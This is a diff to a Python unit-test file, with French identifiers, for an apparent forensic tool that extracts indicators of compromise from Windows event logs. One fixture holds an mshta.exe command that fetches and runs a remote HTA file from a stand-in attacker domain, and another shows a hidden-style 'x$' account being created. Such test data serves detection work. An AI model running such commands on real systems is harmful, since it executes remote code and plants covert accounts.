@@ -119,7 +119,7 @@ class TestIOC(unittest.TestCase):
         evt = N(timestamp=DEPUIS, event_id=4688, host="H1", account="u",
                 details={"destination": "evil.example.net", "task_name": "x.example.com",
                          "member": "a.b.com"})
-        q = N(evt=evt, nature="processus_benin", commande_decodee=None)
+        q = N(evt=evt, nature="processus_suspect", commande_decodee=None, suspect=True)
         ch = N(evenements=[q], comptes_suivis=["u"])
         piv = N(compromissions=[])
         r = extraire_iocs(N(suspectes=[]), piv, [ch])
@@ -204,6 +204,58 @@ class TestIOC(unittest.TestCase):
     def test_stix_sans_ioc(self):
         b = exporter_stix([], os.path.join(self.tmp, "v.json"), GENERE, DEPUIS)
         self.assertEqual({o["type"] for o in b["objects"]}, {"identity", "report"})
+
+
+class TestIOCRevueFinale(unittest.TestCase):
+    @staticmethod
+    def _chronos(*evenements):
+        from types import SimpleNamespace as N
+        qs = []
+        for ts, compte, ligne, suspect in evenements:
+            evt = N(timestamp=ts, event_id=4688, host="H1", account=compte,
+                    details={"command_line": ligne})
+            qs.append(N(evt=evt, nature="processus_suspect" if suspect else "processus_benin",
+                        commande_decodee=None, suspect=suspect))
+        return [N(evenements=qs, comptes_suivis=["u"])]
+
+    def _paires(self, chronos, **kw):
+        from types import SimpleNamespace as N
+        return {(i.type_misp, i.valeur)
+                for i in extraire_iocs(N(suspectes=[]), N(compromissions=[]), chronos, **kw)}
+
+    def test_evenement_benin_sans_motif(self):
+        p = self._paires(self._chronos(
+            (DEPUIS, "m.legit", "chrome.exe https://intranet.acme.fr/rh 10.0.5.5", False)))
+        self.assertEqual(p, set())
+
+    def test_evenement_suspect_garde_motifs_sauf_ip_interne(self):
+        p = self._paires(self._chronos(
+            (DEPUIS, "u", "mshta.exe http://evil.example.xyz/p.hta 10.0.5.5 198.51.100.77",
+             True)))
+        for attendu in (("url", "http://evil.example.xyz/p.hta"),
+                        ("domain", "evil.example.xyz"), ("ip-dst", "198.51.100.77")):
+            self.assertIn(attendu, p)
+        self.assertNotIn(("ip-dst", "10.0.5.5"), p)
+
+    def test_est_interne_injecte(self):
+        chronos = self._chronos((DEPUIS, "u", "x.exe 10.0.5.5 198.51.100.77", True))
+        p = self._paires(chronos, est_interne=lambda ip: ip.startswith("198.51."))
+        self.assertIn(("ip-dst", "10.0.5.5"), p)
+        self.assertNotIn(("ip-dst", "198.51.100.77"), p)
+
+    def test_commentaires_avec_date_si_multi_jours(self):
+        from types import SimpleNamespace as N
+        t0 = datetime(2026, 5, 4, 23, 55, tzinfo=timezone.utc)
+        c = N(ip="198.51.100.10", compte="u", host="H1", t0=t0)
+        evt = N(timestamp=t0, event_id=4720, host="H1", account="u",
+                details={"new_account": "x$"})
+        ch = N(evenements=[N(evt=evt, nature="creation_compte", commande_decodee=None,
+                             suspect=True)], comptes_suivis=["u"])
+        r = extraire_iocs(N(suspectes=[]), N(compromissions=[c]), [ch], multi_jours=True)
+        for i in r:
+            self.assertIn("04/05 23:55", i.commentaire, i.valeur)
+        r = extraire_iocs(N(suspectes=[]), N(compromissions=[c]), [ch])
+        self.assertNotIn("04/05", r[0].commentaire)
 
 
 if __name__ == "__main__":
